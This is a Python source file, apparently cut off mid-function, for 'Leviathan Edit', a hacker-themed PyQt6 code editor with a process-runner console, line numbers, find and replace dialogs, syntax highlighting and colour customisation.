# leviathan_edit.pyw
# LEVIATHAN EDIT v3.0 - PYQT6 POWERED ULTIMATE EDITION
# FIXED: Input handling and crash fixes
# FIXED: File browser integration
# edited version for a file browser and if you're a dev please consider adding some documentation
import file_browser as FB # Import the file_browser module
import sys
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTextEdit, QPushButton, QLabel, QFrame, QComboBox, QSlider,
    QFileDialog, QMessageBox, QToolBar, QStatusBar,
    QScrollArea, QTabWidget, QDialog, QLineEdit,
    QPlainTextEdit, QCheckBox, QColorDialog
)
from PyQt6.QtGui import (
    QFont, QTextCursor, QTextCharFormat, QColor, QPalette, QAction, 
     QPixmap, QPainter, QSyntaxHighlighter, 
    QFontMetrics, QKeySequence, QTextDocument, QBrush
)
from PyQt6.QtCore import (
    Qt, QSize, QRegularExpression, pyqtSignal, QTimer,
    QRect, QRectF, QPoint, QThread, pyqtSlot, QEvent, QObject
)
import base64
import urllib.parse
import re
import os
import json
from datetime import datetime
import hashlib
import signal
import select
import subprocess
import threading
import time

# Import for syntax highlighting
from pygments import highlight
from pygments.lexers import get_lexer_by_name
from pygments.formatters import HtmlFormatter

# Import for auto complete/suggestions
import jedi
from PyQt6.QtWidgets import QListWidget, QListWidgetItem
from PyQt6.QtCore import Qt, QPoint


# ============================================================================
# REPLACE YOUR ENTIRE ProcessWorker CLASS WITH THIS FIXED VERSION
# ============================================================================

class ProcessWorker(QObject):
    output_received = pyqtSignal(str, bool)  # text, is_error
    input_prompt = pyqtSignal(str)
    finished = pyqtSignal()
    process_started = pyqtSignal()
    
    def __init__(self, command, temp_file_path):
        super().__init__()
        self.command = command
        self.temp_file_path = temp_file_path
        self.process = None
        self.process_finished = False
        self.line_buffer = ""
        self.last_prompt_emitted = ""
        
    def run(self):
        try:
            if "python" in self.command.lower():
                self.command = self.command.replace('python ', 'python -u ')
                self.command = self.command.replace('"python" ', '"python" -u ')
            
            env = os.environ.copy()
            if sys.platform == "win32":
                env["PROMPT"] = ""
                env["PYTHONIOENCODING"] = "utf-8"  
                env["PYTHONLEGACYWINDOWSSTDIO"] = "0" 
            
            self.process = subprocess.Popen(
                self.command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
                text=True,
                bufsize=0,
                universal_newlines=True,
                encoding='utf-8',  
                errors='replace',  
                env=env,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if sys.platform == "win32" else 0
            )
            
            self.process_started.emit()
            
            stdout_thread = threading.Thread(target=self.read_stdout, daemon=True)
            stderr_thread = threading.Thread(target=self.read_stderr, daemon=True)
            
            stdout_thread.start()
            stderr_thread.start()
            
            while not self.process_finished and self.process.poll() is None:
                time.sleep(0.05)
            
            stdout_thread.join(timeout=2)
            stderr_thread.join(timeout=2)
            
        except Exception as e:
            self.output_received.emit(f"Process execution error: {str(e)}\n", True)
        finally:
            try:
                if os.path.exists(self.temp_file_path):
                    os.remove(self.temp_file_path)
            except:
                pass
            
            self.finished.emit()
    
    def should_suppress_line(self, line):
        """Check if a line should be suppressed (CMD junk)"""
        line_stripped = line.strip()
        
        if not line_stripped:
            return True
            
        suppress_patterns = [
            r'^[A-Z]:\\',               # ANY Windows path (C:\, C:\Windows, etc)
            r'^title\s',                # title commands
            r'^cls\s*$',                # cls commands
            r'^clear\s*$',              # clear commands
            r'^echo off',               # batch echo
            r'^\s*@echo\s',             # batch echo
        ]
        
        for pattern in suppress_patterns:
            if re.match(pattern, line_stripped, re.IGNORECASE):
                return True
        return False
    
    def read_stdout(self):
        """Read stdout line by line and filter intelligently"""
        try:
            while self.process and self.process.poll() is None and not self.process_finished:
                try:
                    char = self.process.stdout.read(1)
                    
                    if char:
                        self.line_buffer += char
                        
                        # Process complete lines (ending with newline)
                        if char == '\n':
                            line = self.line_buffer
                            
                            # Only emit if not suppressed
                            if not self.should_suppress_line(line):
                                self.output_received.emit(line, False)
                            
                            # Clear buffer
                            self.line_buffer = ""
                        
                        # Handle prompts (no newline) - wait for stable input
                        else:
                            # Wait until buffer has reasonable content
                            if len(self.line_buffer) > 3:
                                # Check if this is CMD junk
                                if self.should_suppress_line(self.line_buffer):
                                    # Keep buffering, don't emit yet
                                    pass
                                else:
                                    # Check if this looks like an input prompt
                                    buffer_lower = self.line_buffer.lower()
                                    prompt_indicators = [':', '?', 'name', 'enter', 'input', 'password', 'age', 'choice']
                                    
                                    # Check if buffer ends with a prompt indicator
                                    ends_with_prompt = any(
                                        self.line_buffer.rstrip().endswith(ind) 
                                        for ind in [':', '?', '> ']
                                    )
                                    
                                    has_prompt_word = any(ind in buffer_lower for ind in prompt_indicators)
                                    
                                    if (ends_with_prompt or has_prompt_word) and len(self.line_buffer.strip()) > 2:
                                        # Wait a moment to ensure no more output
                                        time.sleep(0.1)
                                        
                                        # Check if process is still waiting (not finished)
                                        if self.process.poll() is None:
                                            # Only emit if different from last prompt
                                            if self.line_buffer.strip() != self.last_prompt_emitted:
                                                self.output_received.emit(self.line_buffer, False)
                                                self.input_prompt.emit(self.line_buffer.strip())
                                                self.last_prompt_emitted = self.line_buffer.strip()
                                                self.line_buffer = ""
                    else:
                        time.sleep(0.01)
                        
                except Exception:
                    break
            
            # Emit any remaining buffer at end
            if self.line_buffer.strip() and not self.should_suppress_line(self.line_buffer):
                self.output_received.emit(self.line_buffer, False)
                    
        except Exception:
            pass
    
    def read_stderr(self):
        """Read stderr line by line"""
        try:
            while self.process and self.process.poll() is None and not self.process_finished:
                try:
                    line = self.process.stderr.readline()
                    if line and line.strip():
                        self.output_received.emit(line, True)
                    else:
                        time.sleep(0.01)
                except Exception:
                    pass
        except Exception:
            pass
    
    def send_input(self, text):
        """Send input to the process"""
        if self.process and self.process.poll() is None and not self.process_finished:
            try:
                self.process.stdin.write(text + "\n")
                self.process.stdin.flush()
                self.line_buffer = ""
                self.last_prompt_emitted = ""  # Reset so next prompt shows
                return True
            except Exception as e:
                self.output_received.emit(f"Input error: {str(e)}\n", True)
                return False
        return False
    
    def stop(self):
        """Stop the process gracefully"""
        self.process_finished = True
        if self.process and self.process.poll() is None:
            try:
                if sys.platform == "win32":
                    self.process.terminate()
                else:
                    self.process.send_signal(signal.SIGTERM)
                self.process.wait(timeout=2)
            except:
                try:
                    self.process.kill()
                except:
                    pass

# ==================== LINE NUMBER WIDGET ====================
class LineNumberArea(QWidget):
    def __init__(self, editor):
        super().__init__(editor)
        self.code_editor = editor

    def sizeHint(self):
        return QSize(self.code_editor.line_number_area_width(), 0)

    def paintEvent(self, event):
        self.code_editor.line_number_area_paint_event(event)

class CodeEditorWithLineNumbers(QPlainTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.line_number_area = LineNumberArea(self)
        
        # Connect signals
        self.blockCountChanged.connect(self.update_line_number_area_width)
        self.updateRequest.connect(self.update_line_number_area)
        
        # Initial setup
        self.update_line_number_area_width(0)
        
        # Set default font
        self.setFont(QFont("Consolas", 14))
        
        self.setTabStopDistance(QFontMetrics(self.font()).horizontalAdvance(' ') * 4)
                
    def keyPressEvent(self, event):
        """Handle key presses - convert Tab to spaces and auto-indent"""
    
        # === TAB KEY: Insert 4 spaces instead of tab character ===
        if event.key() == Qt.Key.Key_Tab:
            cursor = self.textCursor()
        
            # If text is selected, indent the entire selection
            if cursor.hasSelection():
                self.indent_selection(cursor)
            else:
                # Insert 4 spaces
                cursor.insertText("    ")
        
            return  # Don't call parent (prevents tab character)
    
        # === SHIFT+TAB: Unindent (dedent) ===
        elif event.key() == Qt.Key.Key_Backtab:  # Shift+Tab
            cursor = self.textCursor()
            self.unindent_selection(cursor)
            return
    
        # === ENTER KEY: Auto-indent to match previous line ===
        elif event.key() in (Qt.Key.Key_Return, Qt.Key.Key_Enter):
            cursor = self.textCursor()
        
            # Get current line
            current_block = cursor.block()
            current_line = current_block.text()
        
            # Count leading spaces
            indent = len(current_line) - len(current_line.lstrip(' '))
        
            # Check if line ends with colon (Python/JS/etc control structures)
            stripped = current_line.rstrip()
            extra_indent = 0
        
            if stripped.endswith(':'):
                # Add extra indentation after colon
                extra_indent = 4
            elif stripped.endswith('{'):
                # For C/Java/JS style braces
                extra_indent = 4
        
            # Insert newline
            cursor.insertText('\n')
        
            # Insert the indentation
            cursor.insertText(' ' * (indent + extra_indent))
        
            self.setTextCursor(cursor)
            return
    
        # For all other keys, use default behavior
        super().keyPressEvent(event)
        
    # ============ THESE MUST BE SEPARATE METHODS (SAME LEVEL AS keyPressEvent) ============
    
    def indent_selection(self, cursor):
        """Indent selected lines by 4 spaces"""
        # Get selection bounds
        start = cursor.selectionStart()
        end = cursor.selectionEnd()
    
        # Move to start of selection
        cursor.setPosition(start)
        cursor.movePosition(QTextCursor.MoveOperation.StartOfBlock)
    
        # Start undo block (so Ctrl+Z undoes all at once)
        cursor.beginEditBlock()
    
        while cursor.position() < end:
            cursor.movePosition(QTextCursor.MoveOperation.StartOfBlock)
            cursor.insertText("    ")  # Add 4 spaces
        
            # Move to next line
            if not cursor.movePosition(QTextCursor.MoveOperation.Down):
                break
        
            # Update end position (it shifts as we add spaces)
            end += 4
    
        cursor.endEditBlock()

    def unindent_selection(self, cursor):
        """Remove up to 4 spaces from start of selected lines"""
        # Get selection bounds
        start = cursor.selectionStart()
        end = cursor.selectionEnd()
    
        # Move to start of selection
        cursor.setPosition(start)
        cursor.movePosition(QTextCursor.MoveOperation.StartOfBlock)
    
        cursor.beginEditBlock()
    
        while cursor.position() < end:
            cursor.movePosition(QTextCursor.MoveOperation.StartOfBlock)
        
            # Get current line
            cursor.select(QTextCursor.SelectionType.LineUnderCursor)
            line = cursor.selectedText()
        
            # Remove up to 4 leading spaces
            spaces_to_remove = 0
            for char in line[:4]:
                if char == ' ':
                    spaces_to_remove += 1
                else:
                    break
        
            if spaces_to_remove > 0:
                # Delete the spaces
                cursor.movePosition(QTextCursor.MoveOperation.StartOfBlock)
                for _ in range(spaces_to_remove):
                    cursor.deleteChar()
            
                end -= spaces_to_remove
        
            # Move to next line
            if not cursor.movePosition(QTextCursor.MoveOperation.Down):
                break
    
        cursor.endEditBlock()
        
    # ============ REST OF THE CODE EDITOR METHODS ============
    
    def line_number_area_width(self):
        digits = 1
        max_num = max(1, self.blockCount())
        while max_num >= 10:
            max_num /= 10
            digits += 1
        space = 3 + self.fontMetrics().horizontalAdvance('9') * digits
        return space

    def update_line_number_area_width(self, newBlockCount):
        self.setViewportMargins(self.line_number_area_width(), 0, 0, 0)

    def update_line_number_area(self, rect, dy):
        if dy:
            self.line_number_area.scroll(0, dy)
        else:
            self.line_number_area.update(0, rect.y(), self.line_number_area.width(), rect.height())
        
        if rect.contains(self.viewport().rect()):
            self.update_line_number_area_width(0)

    def resizeEvent(self, event):
        super().resizeEvent(event)
        cr = self.contentsRect()
        self.line_number_area.setGeometry(QRect(cr.left(), cr.top(), 
                                                self.line_number_area_width(), cr.height()))

    def line_number_area_paint_event(self, event):
        painter = QPainter(self.line_number_area)
    
        # Fill background - get color from parent
        parent = self.parent()
        while parent and not hasattr(parent, 'custom_colors'):
            parent = parent.parent()
    
        bg_color = QColor("#001100")  # Default
        if parent and hasattr(parent, 'custom_colors'):
            bg_color = QColor(parent.custom_colors.get("line_bg", "#001100"))
    
        painter.fillRect(event.rect(), bg_color)
        
        # Draw line numbers
        block = self.firstVisibleBlock()
        block_number = block.blockNumber()
        top = self.blockBoundingGeometry(block).translated(self.contentOffset()).top()
        bottom = top + self.blockBoundingRect(block).height()
        
        # Get current theme colors from parent
        parent = self.parent()
        while parent and not hasattr(parent, 'custom_colors'):
            parent = parent.parent()
        
        text_color = QColor("#00ff41")  # Default if parent not found
        if parent and hasattr(parent, 'custom_colors'):
            text_color = QColor(parent.custom_colors.get("line_text", "#00ff41"))  # Changed from "text" to "line_t
        
        painter.setPen(text_color)
        painter.setFont(QFont("Consolas", self.font().pointSize() - 2))
        
        while block.isValid() and top <= event.rect().bottom():
            if block.isVisible() and bottom >= event.rect().top():
                number = str(block_number + 1)
                painter.drawText(0, int(top), self.line_number_area.width() - 3, 
                               self.fontMetrics().height(),
                               Qt.AlignmentFlag.AlignRight, number)
            
            block = block.next()
            top = bottom
            bottom = top + self.blockBoundingRect(block).height()
            block_number += 1

    def contextMenuEvent(self, event):
        menu = self.createStandardContextMenu()
        
        # Add separator
        menu.addSeparator()
        
        # Add "Find Text" action
        find_action = QAction("Find Text (Ctrl+F)", self)
        find_action.triggered.connect(self.show_find_dialog)
        menu.addAction(find_action)
        
        # Add "Find and Replace" action
        find_replace_action = QAction("Find and Replace (Ctrl+H)", self)
        find_replace_action.triggered.connect(self.show_find_replace_dialog)
        menu.addAction(find_replace_action)
        
        menu.addSeparator()
        
        # Add "Paste Payload" action
        paste_payload_action = QAction("Paste Payload", self)
        # Connect to parent's template dialog
        parent = self.parent()
        while parent and not hasattr(parent, 'open_templates_tool'):
            parent = parent.parent()
        if parent:
            paste_payload_action.triggered.connect(parent.open_templates_tool)
        menu.addAction(paste_payload_action)
        
        menu.exec(event.globalPos())

    def show_find_dialog(self):
        # Get the main window reference
        parent = self.parent()
        while parent and not isinstance(parent, LeviathanEditUltimate):
            parent = parent.parent()
        
        dialog = FindDialog(self, parent)
        dialog.exec()

    def show_find_replace_dialog(self):
        # Get the main window reference
        parent = self.parent()
        while parent and not isinstance(parent, LeviathanEditUltimate):
            parent = parent.parent()
        
        dialog = FindReplaceDialog(self, parent)
        dialog.exec()

# ==================== FIND DIALOG ====================
class FindDialog(QDialog):
    def __init__(self, editor, main_window=None):
        super().__init__(main_window)
        self.editor = editor
        self.setWindowTitle("Find Text")
        self.setFixedSize(400, 200)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 10px;
                font-weight: bold;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 2px solid #00ff88;
            }
            QCheckBox {
                color: #00ffaa;
                font-weight: bold;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Find label
        find_label = QLabel("Find:")
        find_label.setFont(QFont("Consolas", 12))
        layout.addWidget(find_label)
        
        # Find input
        self.find_input = QLineEdit()
        layout.addWidget(self.find_input)
        
        # Options
        options_layout = QHBoxLayout()
        
        self.case_sensitive = QCheckBox("Case Sensitive")
        self.case_sensitive.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.case_sensitive)
        
        self.whole_words = QCheckBox("Whole Words")
        self.whole_words.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.whole_words)
        
        layout.addLayout(options_layout)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        find_next_btn = QPushButton("Find Next")
        find_next_btn.clicked.connect(self.find_next)
        button_layout.addWidget(find_next_btn)
        
        find_prev_btn = QPushButton("Find Previous")
        find_prev_btn.clicked.connect(self.find_previous)
        button_layout.addWidget(find_prev_btn)
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        button_layout.addWidget(close_btn)
        
        layout.addLayout(button_layout)
        
        self.setLayout(layout)
        
        # Set focus to find input
        self.find_input.setFocus()

    def find_next(self):
        text = self.find_input.text()
        if not text:
            return
            
        cursor = self.editor.textCursor()
        flags = QTextDocument.FindFlag(0)
        
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
            
        found = self.editor.find(text, flags)
        if not found:
            # Wrap around
            cursor.movePosition(QTextCursor.MoveOperation.Start)
            self.editor.setTextCursor(cursor)
            self.editor.find(text, flags)

    def find_previous(self):
        text = self.find_input.text()
        if not text:
            return
            
        cursor = self.editor.textCursor()
        flags = QTextDocument.FindFlag(0)
        
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
            
        found = self.editor.find(text, flags | QTextDocument.FindFlag.FindBackward)
        if not found:
            # Wrap around
            cursor.movePosition(QTextCursor.MoveOperation.End)
            self.editor.setTextCursor(cursor)
            self.editor.find(text, flags | QTextDocument.FindFlag.FindBackward)

# ==================== FIND/REPLACE DIALOG ====================
class FindReplaceDialog(QDialog):
    def __init__(self, editor, main_window=None):
        super().__init__(main_window)
        self.editor = editor
        self.setWindowTitle("Find and Replace")
        self.setFixedSize(400, 300)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 8px;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #330000, stop:1 #110000);
                color: #ff4444;
                border: 2px solid #ff4444;
                padding: 10px;
                font-weight: bold;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #550000, stop:1 #330000);
                border: 2px solid #ff8888;
            }
            QCheckBox {
                color: #00ffaa;
                font-weight: bold;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Find label
        find_label = QLabel("Find:")
        find_label.setFont(QFont("Consolas", 12))
        layout.addWidget(find_label)
        
        # Find input
        self.find_input = QLineEdit()
        layout.addWidget(self.find_input)
        
        # Replace label
        replace_label = QLabel("Replace with:")
        replace_label.setFont(QFont("Consolas", 12))
        layout.addWidget(replace_label)
        
        # Replace input
        self.replace_input = QLineEdit()
        layout.addWidget(self.replace_input)
        
        # Options
        options_layout = QHBoxLayout()
        
        self.case_sensitive = QCheckBox("Case Sensitive")
        self.case_sensitive.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.case_sensitive)
        
        self.whole_words = QCheckBox("Whole Words")
        self.whole_words.setFont(QFont("Consolas", 10))
        options_layout.addWidget(self.whole_words)
        
        layout.addLayout(options_layout)
        
        # Buttons
        button_layout1 = QHBoxLayout()
        
        find_next_btn = QPushButton("Find Next")
        find_next_btn.clicked.connect(self.find_next)
        button_layout1.addWidget(find_next_btn)
        
        replace_btn = QPushButton("Replace")
        replace_btn.clicked.connect(self.replace)
        button_layout1.addWidget(replace_btn)
        
        button_layout2 = QHBoxLayout()
        
        replace_all_btn = QPushButton("Replace All")
        replace_all_btn.clicked.connect(self.replace_all)
        button_layout2.addWidget(replace_all_btn)
        
        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        button_layout2.addWidget(close_btn)
        
        layout.addLayout(button_layout1)
        layout.addLayout(button_layout2)
        
        self.setLayout(layout)
        
        # Set focus to find input
        self.find_input.setFocus()

    def find_next(self):
        text = self.find_input.text()
        if not text:
            return
            
        cursor = self.editor.textCursor()
        flags = QTextDocument.FindFlag(0)
        
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
            
        found = self.editor.find(text, flags)
        if not found:
            # Wrap around
            cursor.movePosition(QTextCursor.MoveOperation.Start)
            self.editor.setTextCursor(cursor)
            self.editor.find(text, flags)

    def replace(self):
        find_text = self.find_input.text()
        replace_text = self.replace_input.text()
        
        if not find_text:
            return
            
        cursor = self.editor.textCursor()
        if cursor.hasSelection() and cursor.selectedText() == find_text:
            cursor.insertText(replace_text)
        
        # Find next
        self.find_next()

    def replace_all(self):
        find_text = self.find_input.text()
        replace_text = self.replace_input.text()
        
        if not find_text:
            return
            
        # Move to start
        cursor = self.editor.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.Start)
        self.editor.setTextCursor(cursor)
        
        flags = QTextDocument.FindFlag(0)
        if self.case_sensitive.isChecked():
            flags |= QTextDocument.FindFlag.FindCaseSensitively
        if self.whole_words.isChecked():
            flags |= QTextDocument.FindFlag.FindWholeWords
        
        count = 0
        while self.editor.find(find_text, flags):
            cursor = self.editor.textCursor()
            cursor.insertText(replace_text)
            count += 1
        
        QMessageBox.information(self, "Replace All", f"Replaced {count} occurrences.")

# ==================== SYNTAX HIGHLIGHTER ====================
class SyntaxHighlighter(QSyntaxHighlighter):
    def __init__(self, document, parent_window=None):
        super().__init__(document)
        self.parent_window = parent_window
        self.highlighting_rules = []
        self.update_colors()

    def update_colors(self):
        """Update syntax colors from parent window"""
        self.highlighting_rules = []
    
        # Get colors from parent if available
        if self.parent_window and hasattr(self.parent_window, 'custom_colors'):
            c = self.parent_window.custom_colors
            keyword_color = c.get('syntax_keywords', '#ff6b6b')
            string_color = c.get('syntax_strings', '#98c379')
            comment_color = c.get('syntax_comments', '#5c6370')
            function_color = c.get('syntax_functions', '#61afef')
            number_color = c.get('syntax_numbers', '#d19a66')
        else:
            # Defaults
            keyword_color = '#ff6b6b'
            string_color = '#98c379'
            comment_color = '#5c6370'
            function_color = '#61afef'
            number_color = '#d19a66'
    
        # Define keyword formats
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor(keyword_color))
        keyword_format.setFontWeight(QFont.Weight.Bold)
    
        keywords = [
            '\\bclass\\b', '\\bdef\\b', '\\breturn\\b', '\\bif\\b', '\\belif\\b', 
            '\\belse\\b', '\\bwhile\\b', '\\bfor\\b', '\\bin\\b', '\\btry\\b', 
            '\\bexcept\\b', '\\bfinally\\b', '\\bimport\\b', '\\bfrom\\b', 
            '\\bas\\b', '\\bwith\\b', '\\bpass\\b', '\\bbreak\\b', '\\bcontinue\\b'
        ]
    
        for pattern in keywords:
            rule = (QRegularExpression(pattern), keyword_format)
            self.highlighting_rules.append(rule)
    
        # String format
        string_format = QTextCharFormat()
        string_format.setForeground(QColor(string_color))
        self.highlighting_rules.append((QRegularExpression('\".*\"'), string_format))
        self.highlighting_rules.append((QRegularExpression('\'.*\''), string_format))
    
        # Comment format
        comment_format = QTextCharFormat()
        comment_format.setForeground(QColor(comment_color))
        self.highlighting_rules.append((QRegularExpression('#[^\n]*'), comment_format))
    
        # Function format
        function_format = QTextCharFormat()
        function_format.setForeground(QColor(function_color))
        self.highlighting_rules.append((QRegularExpression('\\b[A-Za-z0-9_]+(?=\\()'), function_format))
    
        # Number format
        number_format = QTextCharFormat()
        number_format.setForeground(QColor(number_color))
        self.highlighting_rules.append((QRegularExpression('\\b[0-9]+\\b'), number_format))
    
        # Rehighlight if document exists
        if self.document():
            self.rehighlight()

    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            expression = pattern
            iterator = expression.globalMatch(text)
            while iterator.hasNext():
                match = iterator.next()
                self.setFormat(match.capturedStart(), match.capturedLength(), format)
                
# ==================== CUSTOMIZATION WINDOW ====================
class CustomizationDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent_window = parent
        self.setWindowTitle("COMPLETE CUSTOMIZATION")
        self.resize(800, 700)
        
        # Store original colors for reset
        self.original_colors = {}
        self.current_colors = {}
        
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        # Title
        title = QLabel("FULL INTERFACE CUSTOMIZATION")
        title.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #ff00ff; background: #110011; padding: 10px; border-radius: 5px;")
        layout.addWidget(title)
        
        # Create tabs for different sections
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid #00ffaa;
                background: #001122;
            }
            QTabBar::tab {
                background: #003322;
                color: #00ffaa;
                padding: 10px;
                margin: 2px;
                border: 1px solid #00ff88;
                border-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #005544;
                color: #ffffff;
            }
        """)
        
        # Tab 1: Sidebar Colors
        sidebar_tab = QWidget()
        sidebar_layout = QVBoxLayout(sidebar_tab)
        
        sidebar_label = QLabel("SIDEBAR CUSTOMIZATION")
        sidebar_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        sidebar_label.setStyleSheet("color: #00ffaa;")
        sidebar_layout.addWidget(sidebar_label)
        
        # Sidebar Background
        self.create_color_picker(sidebar_layout, "Sidebar Background", "sidebar_bg", "#111122")
        
        # Sidebar Title
        self.create_color_picker(sidebar_layout, "Sidebar Title", "sidebar_title", "#00ff41")
        
        # Sidebar Version
        self.create_color_picker(sidebar_layout, "Sidebar Version", "sidebar_version", "#ff0066")
        
        # Sidebar Labels
        self.create_color_picker(sidebar_layout, "Sidebar Labels", "sidebar_labels", "#00ffaa")
        
        # Sidebar Buttons
        self.create_color_picker(sidebar_layout, "Sidebar Buttons - Background", "sidebar_btn_bg", "#002200")
        self.create_color_picker(sidebar_layout, "Sidebar Buttons - Text", "sidebar_btn_text", "#00ff41")
        self.create_color_picker(sidebar_layout, "Sidebar Buttons - Border", "sidebar_btn_border", "#00ff41")
        
        # Sidebar ComboBox
        self.create_color_picker(sidebar_layout, "Sidebar ComboBox", "sidebar_combo", "#001122")
        
        sidebar_layout.addStretch()
        self.tabs.addTab(sidebar_tab, "SIDEBAR")
        
        # Tab 2: Editor Colors
        editor_tab = QWidget()
        editor_layout = QVBoxLayout(editor_tab)
        
        editor_label = QLabel("EDITOR CUSTOMIZATION")
        editor_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        editor_label.setStyleSheet("color: #00ffff;")
        editor_layout.addWidget(editor_label)
        
        # Editor Background
        self.create_color_picker(editor_layout, "Editor Background", "editor_bg", "transparent")
        
        # Editor Text
        self.create_color_picker(editor_layout, "Editor Text", "editor_text", "#00ff41")
        
        # Editor Selection
        self.create_color_picker(editor_layout, "Editor Selection", "editor_selection", "#003300")
        
        # Line Numbers
        self.create_color_picker(editor_layout, "Line Numbers Background", "line_bg", "#001100")
        self.create_color_picker(editor_layout, "Line Numbers Text", "line_text", "#00ff41")
        
        # Syntax Highlighting
        self.create_color_picker(editor_layout, "Keywords", "syntax_keywords", "#ff6b6b")
        self.create_color_picker(editor_layout, "Strings", "syntax_strings", "#98c379")
        self.create_color_picker(editor_layout, "Comments", "syntax_comments", "#5c6370")
        self.create_color_picker(editor_layout, "Functions", "syntax_functions", "#61afef")
        self.create_color_picker(editor_layout, "Numbers", "syntax_numbers", "#d19a66")
        
        editor_layout.addStretch()
        self.tabs.addTab(editor_tab, "EDITOR")
        
        # Tab 3: Toolbar & Console
        toolbar_tab = QWidget()
        toolbar_layout = QVBoxLayout(toolbar_tab)
        
        toolbar_label = QLabel("TOOLBAR & CONSOLE")
        toolbar_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        toolbar_label.setStyleSheet("color: #ffaa00;")
        toolbar_layout.addWidget(toolbar_label)
        
        # Toolbar Background
        self.create_color_picker(toolbar_layout, "Toolbar Background", "toolbar_bg", "#111122")
        
        # Toolbar Buttons
        self.create_color_picker(toolbar_layout, "Toolbar Buttons - Background", "toolbar_btn_bg", "#003300")
        self.create_color_picker(toolbar_layout, "Toolbar Buttons - Text", "toolbar_btn_text", "#00ff41")
        
        # Console Background
        self.create_color_picker(toolbar_layout, "Console Background", "console_bg", "transparent")
        
        # Console Text
        self.create_color_picker(toolbar_layout, "Console Text - Normal", "console_text", "#ff4444")
        self.create_color_picker(toolbar_layout, "Console Text - Error", "console_error", "#ff0000")
        self.create_color_picker(toolbar_layout, "Console Border", "console_border", "#ff4444")
        
        # Status Bar
        self.create_color_picker(toolbar_layout, "Status Bar Background", "status_bg", "#330000")
        self.create_color_picker(toolbar_layout, "Status Bar Text", "status_text", "#ff0066")
        self.create_color_picker(toolbar_layout, "Status Bar Border", "status_border", "#ff0066")
        
        toolbar_layout.addStretch()
        self.tabs.addTab(toolbar_tab, "TOOLBAR")
        
        # Tab 4: Individual Buttons
        buttons_tab = QWidget()
        buttons_layout = QVBoxLayout(buttons_tab)
        
        buttons_label = QLabel("INDIVIDUAL BUTTON CUSTOMIZATION")
        buttons_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        buttons_label.setStyleSheet("color: #ff00ff;")
        buttons_layout.addWidget(buttons_label)
        
        # Note about individual buttons
        note = QLabel("NOTE: Individual button colors will override general button colors.")
        note.setFont(QFont("Consolas", 10))
        note.setStyleSheet("color: #ffff00; background: #333300; padding: 5px;")
        buttons_layout.addWidget(note)
        
        # Create individual button controls
        self.individual_buttons = {}
        button_names = [
            "NEW TAB", "OPEN FILE", "SAVE FILE", "RUN", "EXPLORER",
            "SIDEBAR TOGGLE", "BASE64 TOOL", "URL TOOL", "HASH TOOL",
            "TEMPLATES", "CUSTOMIZE"
        ]
        
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        container = QWidget()
        container_layout = QVBoxLayout(container)
        
        for btn_name in button_names:
            frame = QFrame()
            frame.setFrameStyle(QFrame.Shape.Box)
            frame.setStyleSheet("background: #112233; border: 1px solid #00aaff; border-radius: 4px;")
            frame_layout = QVBoxLayout(frame)
            
            btn_label = QLabel(btn_name)
            btn_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            btn_label.setStyleSheet("color: #00aaff;")
            frame_layout.addWidget(btn_label)
            
            # Button colors
            self.create_color_picker(frame_layout, f"{btn_name} - Background", f"btn_{btn_name.lower().replace(' ', '_')}_bg", "#003300")
